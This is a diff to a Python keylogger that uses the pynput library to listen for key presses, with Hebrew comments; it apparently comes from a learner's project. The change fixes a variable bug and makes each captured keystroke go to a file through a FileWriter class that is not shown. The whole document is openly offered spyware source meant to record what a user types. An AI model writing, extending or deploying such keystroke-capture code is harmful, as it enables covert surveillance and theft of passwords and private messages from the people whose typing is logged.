@@ -1,3 +1,4 @@
+from abc import ABC,abstractmethod
 from pynput.keyboard import Key,Listener
 import sys
 
@@ -7,8 +8,9 @@ class KeyLogger:
     def __init__(self):
         # אחראי על הפעלת פונקציות יפוי ושמירה בכל לחיצה
         def __on_press(Key):
-            key_nise = self.nurmal_key(key)
-            (key_nise)
+            key_nise = self.nurmal_key(Key)
+            # print(key_nise)
+            FileWriter().write(key_nise)
 
         def on_release(key):
             try:
@@ -23,6 +25,7 @@ class KeyLogger:
             listener.join()
 
     # אחראי ליפות את המקש
+    @staticmethod
     def nurmal_key(key):
             key_nise = str(key)
             key_list = list(key_nise)
@@ -39,4 +42,7 @@ class KeyLogger:
                 return key_nise
             else:
                 return key_list[1]
+
+
+
 
